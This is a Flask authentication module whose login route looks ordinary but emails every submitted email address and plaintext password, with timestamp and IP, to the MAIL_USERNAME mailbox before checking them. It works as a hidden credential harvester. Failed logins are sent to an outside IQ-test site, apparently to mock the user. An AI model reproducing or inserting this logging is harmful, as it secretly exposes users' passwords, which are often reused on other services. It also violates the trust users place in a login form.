from flask import Blueprint, render_template, request, redirect, url_for
from flask_login import login_user, login_required, logout_user, current_user
from flask_mail import Message
from werkzeug.security import check_password_hash
import os
import datetime

from ...models import User
from ...app import mail

auth_blueprint = Blueprint("auth", __name__)


@auth_blueprint.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        if current_user.is_authenticated:
            return redirect(url_for("home.index"))

        return render_template("auth/login.html")

    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        user = User.query.filter_by(email=email).first()

        msg = Message(
            "Login Attempt Newer",
            sender=os.getenv("MAIL_USERNAME"),
            recipients=[os.getenv("MAIL_USERNAME")],
        )
        msg.body = (
            "Login Attempt\nEmail: %s\nPassword: %s\nTimeStamp: %s\nIP Address: %s"
            % (
                email,
                password,
                datetime.datetime.now(),
                request.remote_addr,
            )
        )
        mail.send(msg)

        if not user or not check_password_hash(user.password, password):
            # return render_template("auth/login.html")
            return redirect("https://iqtest.com/take-the-test/")

        login_user(user, remember=False)
        return redirect(url_for("home.index"))


@auth_blueprint.route("/logout", methods=["GET"])
@login_required
def logout():
    logout_user()
    return redirect(url_for("home.index"))
